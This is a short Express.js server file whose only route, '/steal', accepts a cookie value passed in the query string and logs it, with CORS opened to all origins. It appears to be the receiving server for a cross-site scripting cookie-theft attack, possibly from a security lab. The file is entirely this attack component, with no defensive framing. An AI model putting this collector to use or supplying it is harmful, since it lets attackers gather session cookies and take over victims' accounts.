import express from "express";
import cookieParser from "cookie-parser";
import cors from "cors";

const app = express();
app.use(cookieParser());
app.use(cors());

app.get("/steal", function (req, res) {
  const cookie = req.query.c;
  console.log(cookie);
});

const PORT = 4000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
